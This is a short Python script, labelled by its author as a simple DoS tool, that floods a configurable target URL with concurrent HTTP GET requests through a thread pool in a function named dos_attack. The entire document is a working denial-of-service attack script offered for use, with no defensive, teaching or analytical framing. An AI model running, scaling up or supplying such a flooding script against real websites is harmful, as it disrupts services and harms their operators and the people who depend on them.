#this simple dos by ratichubi

import requests
import concurrent.futures

# Target URL to send requests
target_url = "http://example.com"

# Number of requests to send
num_requests = 100

def send_request(url):
    try:
        response = requests.get(url)
        print(f"Request sent to {url}, Status code: {response.status_code}")
    except Exception as e:
        print(f"Error sending request to {url}: {str(e)}")

def dos_attack(url, num_requests):
    # Send multiple requests concurrently
    with concurrent.futures.ThreadPoolExecutor(max_workers=num_requests) as executor:
        executor.map(send_request, [url] * num_requests)

if __name__ == "__main__":
    dos_attack(target_url, num_requests)
